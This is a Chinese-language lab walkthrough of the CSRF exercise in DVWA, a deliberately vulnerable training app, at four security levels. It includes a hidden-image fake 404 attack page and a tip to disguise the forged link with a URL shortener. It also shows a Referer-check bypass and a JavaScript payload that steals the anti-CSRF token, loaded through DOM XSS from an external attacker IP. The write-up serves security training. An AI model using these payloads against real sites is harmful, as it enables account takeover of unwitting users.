<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><pre><code>&lt;?php 

if( isset( $_GET[ &apos;Change&apos; ] ) ) { 
    // Get input 
    $pass_new  = $_GET[ &apos;password_new&apos; ]; 
    $pass_conf = $_GET[ &apos;password_conf&apos; ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; 
        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

        // Feedback for the user 
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
    } 
    else { 
        // Issue with passwords matching 
        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
} 

?&gt; </code></pre><p>代码审计可以发现，没有任何防csrf的机制，</p>
<p><img src="assets%5C1554360274997.png" alt="1554360274997"></p>
<pre><code>http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</code></pre><p>在服务器端身份验证信息（cookie）未过期时，可以通过CSRF漏洞来更改登录密码，</p>
<p>方法一：直接点击上述网址，密码更改成功，但URL参数会暴露密码被修改，用户容易发现密码被篡改</p>
<p>方法二：对构造的URL进行百度短链接操作，达到一定的隐藏效果（注意需要域名才能伪造，ip链接无法伪造）</p>
<p>方法三：自行构造攻击界面</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
    &lt;title&gt;Document&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;img src=&quot;http://localhost/dvwa/vulnerabilities/csrf/?password_new=hello&amp;password_conf=hello&amp;Change=Change#&quot; style=&quot;display:none;&quot;&gt;
    &lt;h1&gt;404&lt;/h1&gt;
    &lt;p&gt;链接不存在&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><pre><code>
&lt;?php 

if( isset( $_GET[ &apos;Change&apos; ] ) ) { 
    // Checks to see where the request came from 
    if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { 
        // Get input 
        $pass_new  = $_GET[ &apos;password_new&apos; ]; 
        $pass_conf = $_GET[ &apos;password_conf&apos; ]; 

        // Do the passwords match? 
        if( $pass_new == $pass_conf ) { 
            // They do! 
            $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
            $pass_new = md5( $pass_new ); 

            // Update the database 
            $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; 
            $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

            // Feedback for the user 
            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
        } 
        else { 
            // Issue with passwords matching 
            echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
        } 
    } 
    else { 
        // Didn&apos;t come from a trusted source 
        echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
} 

?&gt; </code></pre><p>medium级别加入了验证</p>
<p>stripos（string a,string b)：查询a字符串中是否有b,有则返回位置，没有返回false</p>
<p>中级过滤检查HTTP_REFERER (referer)是否含有SERVER_NAME（host)</p>
<p>此处可以将攻击界面命名为ip(host对应).html，将攻击界面一台服务器上，这样referer中就会含有host的ip</p>
<p><img src="assets%5C1554375941380.png" alt="1554375941380"></p>
<p>此时我们的Referer中确实含有host的ip地址，所以攻击成功，密码为改为hello</p>
<h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><pre><code>&lt;?php 

if( isset( $_GET[ &apos;Change&apos; ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 

    // Get input 
    $pass_new  = $_GET[ &apos;password_new&apos; ]; 
    $pass_conf = $_GET[ &apos;password_conf&apos; ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; 
        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

        // Feedback for the user 
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
    } 
    else { 
        // Issue with passwords matching 
        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
    } 

    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt; </code></pre><p>代码审计可知，high级别加入了token验证机制，每次提交会先检查token，token如果不对将直接拒绝修改密码，因为我们要想办法获取到token，因为涉及到跨域的问题，因此我们需要借助DOM XSS漏洞</p>
<p>在攻击者的服务器上防止xss.js</p>
<pre><code>alert(document.cookie);
var theUrl = &apos;http://127.0.0.1/dvwa/vulnerabilities/csrf/&apos;;
if(window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
}else{
    xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
}
var count = 0;
xmlhttp.withCredentials = true;
xmlhttp.onreadystatechange=function(){
    if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)
    {
        var text = xmlhttp.responseText;
        var regex = /user_token\&apos; value\=\&apos;(.*?)\&apos; \/\&gt;/;
        var match = text.match(regex);
        console.log(match);
        alert(match[1]);
            var token = match[1];
                var new_url = &apos;http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token=&apos;+token+&apos;&amp;password_new=hello&amp;password_conf=hello&amp;Change=Change&apos;;
                if(count==0){
                    count++;
                    xmlhttp.open(&quot;GET&quot;,new_url,false);
                    xmlhttp.send();
                }


    }
};
xmlhttp.open(&quot;GET&quot;,theUrl,false);
xmlhttp.send();</code></pre><p>在DOM XSS界面访问如下界面，即可修改密码为hello</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English#&lt;script src=&quot;http://35.194.165.4/Webtest/DVWA/xss.js&quot;&gt;&lt;/script&gt;</code></pre><h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><pre><code>&lt;?php 

if( isset( $_GET[ &apos;Change&apos; ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 

    // Get input 
    $pass_curr = $_GET[ &apos;password_current&apos; ]; 
    $pass_new  = $_GET[ &apos;password_new&apos; ]; 
    $pass_conf = $_GET[ &apos;password_conf&apos; ]; 

    // Sanitise current password input 
    $pass_curr = stripslashes( $pass_curr ); 
    $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
    $pass_curr = md5( $pass_curr ); 

    // Check that the current password is correct 
    $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); 
    $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); 
    $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); 
    $data-&gt;execute(); 

    // Do both new passwords match and does the current password match the user? 
    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { 
        // It does! 
        $pass_new = stripslashes( $pass_new ); 
        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
        $pass_new = md5( $pass_new ); 

        // Update database with new password 
        $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); 
        $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); 
        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); 
        $data-&gt;execute(); 

        // Feedback for the user 
        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
    } 
    else { 
        // Issue with passwords matching 
        echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt; </code></pre><p>Impossible利用PDO来控制sql注入，修改密码时要求输入原密码，因此无论如何，若不知道之前的密码，怎么都无法修改密码</p>
